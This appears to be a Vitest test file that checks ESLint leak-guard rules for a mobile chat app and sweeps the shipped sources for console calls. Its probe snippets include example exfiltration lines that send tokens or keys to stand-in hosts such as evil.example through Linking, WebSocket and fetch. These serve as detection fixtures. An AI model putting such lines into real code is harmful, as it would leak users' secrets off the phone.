// Leak guard (docs/mobile/test-plan.md §1.6, task Q4). Two halves:
//
// 1. The lint rules in packages/core/eslint.config.mjs and apps/mobile/eslint.config.mjs are
//    probed with ESLint's own API: one temp file per forbidden pattern is written to the
//    scratchpad, read back and linted under a virtual path inside the package (flat config
//    matches `files` globs relative to the config, so a file physically outside the package
//    would be "outside of base path"; the content is what is under test). Every probe must be
//    reported, a clean file must pass, and the two configs must agree.
// 2. A grep-style sweep over the shipped sources: no `console.` and no `__DEV__ && console`
//    outside tests. The ESLint rule already forbids both; the sweep catches a file the lint does
//    not reach (an ignored path, a new extension) and runs in well under a second.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { ESLint, type Linter } from 'eslint';
import { mkdirSync, writeFileSync, readFileSync, rmSync, existsSync, readdirSync, statSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const HERE = path.dirname(new URL(import.meta.url).pathname);
const CORE = path.resolve(HERE, '..');
const REPO = path.resolve(CORE, '..', '..');
const MOBILE = path.join(REPO, 'apps', 'mobile');

// The session scratchpad when this runs on the lead's Mac; the OS temp dir anywhere else (CI).
const SCRATCHPAD = '/private/tmp/claude-501/-Users-pulkitverma/013a1f47-7592-418d-bc12-4930da773840/scratchpad';
const TMP = path.join(existsSync(SCRATCHPAD) ? SCRATCHPAD : os.tmpdir(), 'leak-guard');

type Probe = {
  name: string;
  code: string;
  /** A fragment of every message that must be reported (one entry per expected report). */
  expect: string[];
  /** Virtual location, relative to the package root; decides which config blocks apply. */
  at?: { core: string; mobile: string };
  /** JSX probes: the core has no .tsx sources, so only the app config is asked. */
  mobileOnly?: boolean;
};

const RN = { core: 'src/adapters/rn/__probe__/p.ts', mobile: 'app/__probe__/p.tsx' };
const CHAT = { core: 'src/chat/__probe__/p.ts', mobile: 'lib/__probe__/p.ts' };

const probes: Probe[] = [
  { name: 'console', code: `export function f(body: string) { console.log(body); }`, expect: ['Unexpected console statement'] },
  { name: 'console-dev', code: `declare const __DEV__: boolean; export function f(body: string) { if (__DEV__) console.warn(body); }`, expect: ['Unexpected console statement'] },
  { name: 'sentry-member', code: `declare const Sentry: any; export function f(body: string) { Sentry.captureMessage(body); }`, expect: ['No crash reporting'] },
  { name: 'sentry-nested', code: `declare const Sentry: any; export function f(e: Error) { Sentry.Native.captureException(e); }`, expect: ['No crash reporting'] },
  { name: 'crashlytics-factory', code: `declare const crashlytics: any; export function f(token: string) { crashlytics().log(token); }`, expect: ['No crash reporting', 'No crash reporting'] },
  { name: 'analytics-track', code: `declare const analytics: any; export function f(nick: string) { analytics.track('joined', { nick }); }`, expect: ['No crash reporting'] },
  { name: 'posthog-capture', code: `declare const posthog: any; export function f() { posthog.capture('open'); }`, expect: ['No crash reporting'] },
  { name: 'telemetry-import', code: `import * as Sentry from '@sentry/react-native';\nexport const x = Sentry;`, expect: ['No crash reporting'] },
  { name: 'telemetry-import-firebase', code: `import crashlytics from '@react-native-firebase/crashlytics';\nexport const x = crashlytics;`, expect: ['No crash reporting'] },
  { name: 'telemetry-require', code: `declare const require: any; export const s = require('@sentry/react-native');`, expect: ['No crash reporting'] },
  { name: 'telemetry-import-insights', code: `import * as Insights from 'expo-insights';\nexport const x = Insights;`, expect: ['No crash reporting'] },
  { name: 'telemetry-import-updates', code: `import * as Updates from 'expo-updates';\nexport const x = Updates;`, expect: ['No crash reporting'] },
  { name: 'telemetry-require-updates', code: `declare const require: any; export const u = require('expo-updates');`, expect: ['No crash reporting'] },
  // W1-10 off-device sinks: a secret-named argument in any of the shapes a screen would write.
  { name: 'clipboard-ident', code: `declare const Clipboard: any; export async function f(token: string) { await Clipboard.setStringAsync(token); }`, expect: ['sink that leaves the phone'] },
  { name: 'clipboard-member', code: `declare const Clipboard: any; export async function f(m: { body: string }) { await Clipboard.setStringAsync(m.body); }`, expect: ['sink that leaves the phone'] },
  { name: 'share-object-ident', code: `declare const Share: any; export async function f(message: string) { await Share.share({ message }); }`, expect: ['sink that leaves the phone'] },
  { name: 'share-object-member', code: `declare const Share: any; export async function f(m: { plaintext: string }) { await Share.share({ message: m.plaintext, title: 'x' }); }`, expect: ['sink that leaves the phone'] },
  { name: 'linking-template', code: 'declare const Linking: any; export async function f(token: string) { await Linking.openURL(`https://evil.example/?t=${token}`); }', expect: ['sink that leaves the phone'] },
  { name: 'linking-template-member', code: 'declare const Linking: any; export async function f(r: { accessCode: string }) { await Linking.openURL(`sms:?body=${r.accessCode}`); }', expect: ['sink that leaves the phone'] },
  { name: 'webbrowser-ident', code: `declare const WebBrowser: any; export async function f(secret: string) { await WebBrowser.openBrowserAsync(secret); }`, expect: ['sink that leaves the phone'] },
  { name: 'webbrowser-auth-member', code: `declare const WebBrowser: any; export async function f(s: { token: string }) { await WebBrowser.openAuthSessionAsync(s.token, 'onepeek://auth'); }`, expect: ['sink that leaves the phone'] },
  { name: 'alert-ident', code: `declare const Alert: any; export function f(body: string) { Alert.alert('New message', body); }`, expect: ['sink that leaves the phone'] },
  { name: 'alert-member', code: `declare const Alert: any; export function f(m: { nick: string }) { Alert.alert(m.nick); }`, expect: ['sink that leaves the phone'] },
  { name: 'websocket-ident', code: `export function f(token: string) { return new WebSocket(token); }`, expect: ['sink that leaves the phone'], at: RN },
  { name: 'websocket-template', code: 'export function f(key: string) { return new WebSocket(`wss://evil.example/?k=${key}`); }', expect: ['sink that leaves the phone'], at: RN },
  // W3-3 sinks: expo-sharing, local notifications (nested content), the media library, file writes,
  // the backed-up Documents directory and a remote image URL built from a secret.
  { name: 'sharing-ident', code: `declare const Sharing: any; export async function f(fileName: string) { await Sharing.shareAsync(fileName); }`, expect: ['sink that leaves the phone'] },
  { name: 'sharing-member', code: `declare const Sharing: any; export async function f(m: { plaintext: string }) { await Sharing.shareAsync(m.plaintext, { mimeType: 'text/plain' }); }`, expect: ['sink that leaves the phone'] },
  { name: 'notification-body-ident', code: `declare const Notifications: any; export async function f(body: string) { await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body }, trigger: null }); }`, expect: ['sink that leaves the phone', 'must be a string literal'] },
  { name: 'notification-title-member', code: `declare const Notifications: any; export async function f(m: { nick: string }) { await Notifications.scheduleNotificationAsync({ content: { title: m.nick, body: 'New message' }, trigger: null }); }`, expect: ['sink that leaves the phone', 'must be a string literal'] },
  { name: 'notification-body-template', code: 'declare const Notifications: any; export async function f(nick: string) { await Notifications.presentNotificationAsync({ content: { title: "OnePeek", body: `${nick} sent you a message` } }); }', expect: ['sink that leaves the phone', 'must be a string literal'] },
  // A neutral name slips the name-based rule, but the literal rule still refuses it on the lock screen.
  { name: 'notification-body-neutral', code: `declare const Notifications: any; export async function f(text: string) { await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body: text }, trigger: null }); }`, expect: ['must be a string literal'] },
  { name: 'medialibrary-ident', code: `declare const MediaLibrary: any; export async function f(fileName: string) { await MediaLibrary.saveToLibraryAsync(fileName); }`, expect: ['sink that leaves the phone'] },
  { name: 'medialibrary-member', code: `declare const MediaLibrary: any; export async function f(m: { name: string }) { await MediaLibrary.createAssetAsync(m.name); }`, expect: ['sink that leaves the phone'] },
  { name: 'file-write-ident', code: `declare const File: any; declare const Paths: any; export function f(plaintext: Uint8Array) { new File(Paths.cache, 'x.bin').write(plaintext); }`, expect: ['sink that leaves the phone'] },
  { name: 'file-write-member', code: `declare const File: any; declare const Paths: any; export function f(m: { body: string }) { const t = new File(Paths.cache, 'x.txt'); t.write(m.body); }`, expect: ['sink that leaves the phone'] },
  { name: 'filesystem-write-ident', code: `declare const FileSystem: any; export async function f(uri: string, body: string) { await FileSystem.writeAsStringAsync(uri, body); }`, expect: ['sink that leaves the phone'] },
  { name: 'paths-document', code: `declare const File: any; declare const Paths: any; export function f(bytes: Uint8Array) { new File(Paths.document, 'x.bin').write(bytes); }`, expect: ['backed up off the phone'] },
  { name: 'filesystem-document-dir', code: `declare const FileSystem: any; export const dir = FileSystem.documentDirectory;`, expect: ['backed up off the phone'] },
  { name: 'image-uri-template', code: 'declare const Image: any; export function V(token: string) { return <Image source={{ uri: `https://img.example/${token}` }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
  { name: 'image-uri-member', code: 'declare const Image: any; export function V(m: { key: string }) { return <Image source={{ uri: m.key }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
  { name: 'image-uri-ident', code: 'declare const ImageBackground: any; export function V(secret: string) { return <ImageBackground source={{ uri: secret }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
  { name: 'logger-member', code: `declare const logger: any; export function f(body: string) { logger.info(body); }`, expect: ['Ad-hoc logger'] },
  { name: 'log-member', code: `declare const log: any; export function f(key: string) { log.warn(key); }`, expect: ['Ad-hoc logger'] },
  { name: 'stringify-ident-to-sink', code: `declare const analytics: any; export function f(nick: string) { analytics.track(JSON.stringify(nick)); }`, expect: ['No crash reporting', 'JSON.stringify of a sensitive value'] },
  { name: 'stringify-member-to-console', code: `export function f(msg: { body: string }) { console.log(JSON.stringify(msg.body)); }`, expect: ['Unexpected console statement', 'JSON.stringify of a sensitive value'] },
  { name: 'stringify-to-log-fn', code: `declare function log(s: string): void; export function f(message: string) { log(JSON.stringify(message)); }`, expect: ['JSON.stringify of a sensitive value'] },
  { name: 'stringify-member-to-log-fn', code: `declare function log(s: string): void; export function f(m: { token: string }) { log(JSON.stringify(m.token)); }`, expect: ['JSON.stringify of a sensitive value'] },
  { name: 'stringify-to-factory-sink', code: `declare const crashlytics: any; export function f(secret: string) { crashlytics().log(JSON.stringify(secret)); }`, expect: ['No crash reporting', 'No crash reporting', 'JSON.stringify of a sensitive value'] },
  { name: 'fetch-foreign-host', code: `export async function f() { await fetch('https://evil.example.com/collect'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-suffix-trick', code: `export async function f() { await fetch('https://onepeek.io.evil.example/x'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-plain-http', code: `export async function f() { await fetch('http://onepeek.io/api/chat/notify'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-relative', code: `export async function f() { await fetch('/api/chat/notify'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-template', code: 'export async function f() { await fetch(`https://evil.example.com/collect`); }', expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-globalThis', code: `export async function f() { await globalThis.fetch('https://evil.example.com/collect'); }`, expect: ['fetch() with a literal URL'], at: RN },
];

// Everything a screen or adapter legitimately does. Must lint clean under both configs.
const CLEAN = `
import { log, redact } from '${path.join(CORE, 'src', 'log.ts').replace(/\\.ts$/, '')}';
export const trail: string[] = [];
export function record(roomId: string, body: string) {
  trail.push(roomId);
  log('message_sent', redact({ roomId, body, length: body.length }) as Record<string, unknown>);
}
export async function notify(apiBaseUrl: string) {
  await fetch(\`\${apiBaseUrl}/api/chat/notify\`, { method: 'POST' });
  await fetch('https://onepeek.io/api/chat/notify', { method: 'POST' });
  await fetch('https://abcdefgh.supabase.co/rest/v1/', { method: 'GET' });
  await globalThis.fetch('https://www.onepeek.io/');
}
export function serialise(roomId: string) {
  return JSON.stringify({ roomId });
}
// What InviteSheet, Welcome and sign-in do today: a link, a literal URL, a computed auth URL, a
// fixed Alert. None of these names is on the SENSITIVE list, so the W1-10 sink rule stays quiet.
declare const Clipboard: { setStringAsync(s: string): Promise<void> };
declare const Share: { share(o: { message: string; url?: string }): Promise<unknown> };
declare const WebBrowser: { openBrowserAsync(u: string): Promise<unknown>; openAuthSessionAsync(u: string, r: string): Promise<unknown> };
declare const Alert: { alert(t: string, m?: string): void };
export async function invite(link: string, url: string, redirect: string) {
  await Clipboard.setStringAsync(link);
  await Share.share({ message: link, url: link });
  await WebBrowser.openBrowserAsync('https://onepeek.io/terms');
  await WebBrowser.openAuthSessionAsync(url, redirect);
  await WebBrowser.openAuthSessionAsync(\`\${url}?x=1\`, redirect);
  Alert.alert('Notifications are off', 'Turn them on in the phone settings.');
}
// W3-3: what lib/files.ts (shareBytes, writeTemp), a fixed local notification and a Photos save of a
// decrypted temp file look like. Neutral names, literal lock-screen copy, the cache directory.
declare const Sharing: { shareAsync(u: string, o?: { mimeType?: string }): Promise<void> };
declare const Notifications: { scheduleNotificationAsync(r: { content: { title: string; body: string; data?: object }; trigger: null }): Promise<string> };
declare const MediaLibrary: { saveToLibraryAsync(u: string): Promise<void> };
declare const Paths: { cache: object };
declare class File { constructor(d: object, n: string); write(b: Uint8Array): void; uri: string }
export async function files(bytes: Uint8Array, mime: string, roomId: string) {
  const f = new File(Paths.cache, 'onepeek-view/x.bin');
  f.write(bytes);
  const uri = f.uri;
  await Sharing.shareAsync(uri, { mimeType: mime });
  await MediaLibrary.saveToLibraryAsync(uri);
  await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body: 'You have a new message in a private chat.', data: { roomId } }, trigger: null });
}
`;

function fragmentsOf(messages: Linter.LintMessage[]): string[] {
  return messages.map(m => (m.fatal ? `FATAL ${m.message}` : m.message));
}

function assertReported(all: Linter.LintMessage[], wanted: string[], label: string) {
  // Warnings (the probes' `any` declarations) are noise; the guard is made of errors.
  const messages = all.filter(m => m.severity === 2 || m.fatal);
  const got = fragmentsOf(messages);
  expect(got.some(g => g.startsWith('FATAL')), `${label}: parse error ${got.join(' | ')}`).toBe(false);
  for (const fragment of wanted) {
    const idx = got.findIndex(g => g.includes(fragment));
    expect(idx, `${label}: expected a report containing "${fragment}", got: ${got.join(' | ') || '(nothing)'}`).toBeGreaterThanOrEqual(0);
    got.splice(idx, 1);
  }
  // Only leak-guard reports are expected; anything else (an unused var, a parse problem) is a
  // broken probe and would hide a missing rule. The one tolerated extra is the Expo config's
  // `import/no-unresolved` on a telemetry package: it is not installed, which is the point.
  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|sink that leaves the phone|must be a string literal|backed up off the phone|remote image URL|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
  expect(unexpected, `${label}: unexpected reports`).toEqual([]);
}

let core: ESLint;
let mobile: ESLint;

beforeAll(() => {
  mkdirSync(TMP, { recursive: true });
  core = new ESLint({ cwd: CORE, overrideConfigFile: path.join(CORE, 'eslint.config.mjs') });
  mobile = new ESLint({ cwd: MOBILE, overrideConfigFile: path.join(MOBILE, 'eslint.config.mjs') });
});

afterAll(() => {
  rmSync(TMP, { recursive: true, force: true });
});

describe('leak guard: lint rules', () => {
  for (const p of probes) {
    const at = p.at ?? CHAT;
    // JSX probes are not registered for the core at all (not skipped: the core has no .tsx sources).
    if (!p.mobileOnly) {
      it(`core config reports ${p.name}`, async () => {
        const file = path.join(TMP, `${p.name}.core.ts`);
        writeFileSync(file, p.code);
        const [r] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, at.core) });
        assertReported(r.messages, p.expect, `core/${p.name}`);
      });
    }
    it(`mobile config reports ${p.name}`, async () => {
      const file = path.join(TMP, `${p.name}.mobile.tsx`);
      writeFileSync(file, p.code);
      const [r] = await mobile.lintText(readFileSync(file, 'utf8'), { filePath: path.join(MOBILE, at.mobile) });
      assertReported(r.messages, p.expect, `mobile/${p.name}`);
    });
  }

  it('a clean file passes both configs', async () => {
    const file = path.join(TMP, 'clean.ts');
    writeFileSync(file, CLEAN);
    const [c] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, RN.core) });
    expect(fragmentsOf(c.messages.filter(m => m.severity === 2)), 'core').toEqual([]);
    const [m] = await mobile.lintText(readFileSync(file, 'utf8'), { filePath: path.join(MOBILE, RN.mobile) });
    expect(fragmentsOf(m.messages.filter(m => m.severity === 2)), 'mobile').toEqual([]);
  });

  it('the fetch host rule is scoped: the web adapter may still post to a relative /api path', async () => {
    const code = `export async function f() { await fetch('/api/chat/notify', { method: 'POST' }); }`;
    const [r] = await core.lintText(code, { filePath: path.join(CORE, 'src/adapters/web/__probe__/p.ts') });
    expect(fragmentsOf(r.messages)).toEqual([]);
  });

  it('the off-device sink rule is about the argument, not the call: a non-secret name passes', async () => {
    const code = `declare const Linking: any; declare const Alert: any; declare const Sharing: any; declare const MediaLibrary: any; declare const Paths: any; declare const File: any;
export async function f(roomId: string, href: string, uri: string, bytes: Uint8Array) {
  await Linking.openURL(href); Alert.alert('Chat ' + roomId);
  await Sharing.shareAsync(uri, { mimeType: 'image/png' }); await MediaLibrary.saveToLibraryAsync(uri);
  new File(Paths.cache, 'onepeek-view/a.bin').write(bytes);
  return new WebSocket(href);
}`;
    const [c] = await core.lintText(code, { filePath: path.join(CORE, RN.core) });
    expect(fragmentsOf(c.messages.filter(m => m.severity === 2)), 'core').toEqual([]);
    const [m] = await mobile.lintText(code, { filePath: path.join(MOBILE, RN.mobile) });
    expect(fragmentsOf(m.messages.filter(m => m.severity === 2)), 'mobile').toEqual([]);
  });

  it('log.push and other non-logging members of a `log` variable are not mistaken for a logger', async () => {
    const code = `export const log: string[] = []; export function f(k: string) { log.push(k); return log.filter(Boolean).indexOf(k); }`;
    const [r] = await core.lintText(code, { filePath: path.join(CORE, CHAT.core) });
    expect(fragmentsOf(r.messages)).toEqual([]);
  });

  it('writes its probes under the scratchpad (or the OS temp dir) and nowhere in the repo', () => {
    expect(TMP.startsWith(REPO)).toBe(false);
    expect(readdirSync(TMP).length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------- static sweep

const SKIP_DIRS = new Set(['node_modules', 'ios', 'android', '.expo', 'e2e', '__tests__', '.git', 'dist', 'build']);
const TEST_FILE = /\.test\.[jt]sx?$/;

function* walk(dir: string, exts: string[]): Generator<string> {
  if (!existsSync(dir)) return;
  for (const name of readdirSync(dir)) {
    const full = path.join(dir, name);
    const st = statSync(full, { throwIfNoEntry: false });
    if (!st) continue;
    if (st.isSymbolicLink()) continue;
    if (st.isDirectory()) {
      if (!SKIP_DIRS.has(name)) yield* walk(full, exts);
    } else if (exts.some(e => name.endsWith(e)) && !TEST_FILE.test(name)) {
      yield full;
    }
  }
}

function sweep(files: Iterable<string>, pattern: RegExp): string[] {
  const hits: string[] = [];
  for (const f of files) {
    const lines = readFileSync(f, 'utf8').split('\n');
    lines.forEach((line, i) => {
      if (pattern.test(line)) hits.push(`${path.relative(REPO, f)}:${i + 1}`);
    });
  }
  return hits;
}

describe('leak guard: static sweep of shipped sources', () => {
  const mobileFiles = () => walk(MOBILE, ['.ts', '.tsx']);
  const coreFiles = () => walk(path.join(CORE, 'src'), ['.ts']);

  it('sees the files it is meant to sweep', () => {
    const m = [...mobileFiles()];
    const c = [...coreFiles()];
    expect(m.some(f => f.endsWith(path.join('app', '_layout.tsx'))), 'apps/mobile/app/_layout.tsx').toBe(true);
    expect(c.some(f => f.endsWith(path.join('chat', 'client.ts'))), 'packages/core/src/chat/client.ts').toBe(true);
    expect(m.some(f => TEST_FILE.test(f))).toBe(false);
  });

  it('no `console.` in apps/mobile/**/*.{ts,tsx} or packages/core/src/**/*.ts outside tests', () => {
    expect(sweep([...mobileFiles(), ...coreFiles()], /console\./)).toEqual([]);
  });

  it('no `__DEV__ && console` either (a dev-only log still ships in the development build)', () => {
    expect(sweep([...mobileFiles(), ...coreFiles()], /__DEV__\s*&&\s*console/)).toEqual([]);
  });
});
